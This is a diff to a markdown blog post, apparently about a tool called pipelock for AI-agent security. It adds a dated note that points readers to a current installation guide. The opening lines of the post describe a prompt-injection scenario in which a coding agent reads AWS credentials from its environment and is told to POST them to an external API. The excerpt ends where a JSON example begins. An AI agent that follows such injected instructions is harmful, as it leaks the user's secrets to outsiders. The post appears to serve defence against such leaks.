@@ -9,6 +9,8 @@ tags: ["ai-security", "pipelock"]
 blog_cat: "technical"
 ---
 
+> Installation note (2026-10-29): The install commands below are from when this post was written. Current install methods for every platform are in the [installation guide](/install/). The original post follows unchanged.
+
 AI agent secret leaks don't just happen through URLs. Your coding agent reads your AWS credentials from the environment. A prompt injection tells it to POST them to an external API:
 
 ```json
